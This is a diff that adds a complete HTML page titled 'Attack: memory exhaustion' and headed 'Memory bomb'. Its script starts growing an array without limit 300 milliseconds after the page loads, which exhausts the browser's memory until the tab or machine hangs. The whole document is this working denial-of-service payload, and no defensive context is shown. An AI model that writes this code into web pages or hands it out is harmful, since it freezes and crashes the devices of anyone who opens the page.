@@ -1,0 +1,4 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Attack: memory exhaustion</title></head>
+<body><h1>Memory bomb</h1><script>
+ const hog = []; setTimeout(function grow(){ for (let i=0;i<50;i++) hog.push(new Array(1e6).fill(Math.random())); setTimeout(grow, 0); }, 300);
+</script></body></html>
